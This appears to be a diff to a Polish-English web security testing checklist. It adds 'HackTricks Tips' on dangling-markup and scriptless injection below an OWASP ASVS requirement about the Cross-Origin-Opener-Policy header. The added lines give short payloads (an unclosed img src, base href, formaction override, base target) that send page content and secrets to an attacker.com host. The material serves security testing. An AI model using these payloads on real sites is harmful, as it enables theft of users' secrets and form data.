@@ -229,3 +229,15 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
 | V3.4.8 | Browser Security Mechanism Headers | Verify that all HTTP responses that initiate a document rendering (such as responses with Content-Type text/html), include the Cross‑Origin‑Opener‑Policy header field with the same-origin directive or the same-origin-allow-popups directive as required. This prevents attacks that abuse shared access to Window objects, such as tabnabbing and frame counting. |
+
+
+---
+
+## HackTricks Tips
+
+### Dangling Markup / Scriptless Injection
+
+- **Unclosed attribute theft**: `<img src='http://attacker.com/?` — page content (w tym secrets) wysłane do next quote
+- **Form hijacking**: `<base href="http://attacker.com/">` — relative form actions → attacker
+- **`formaction` override**: `<button formaction="https://attacker.com">` nadpisuje form action
+- **CSP bypass z user interaction**: `<a href=http://attacker.net>Click</a><base target='` → `window.name` = HTML content
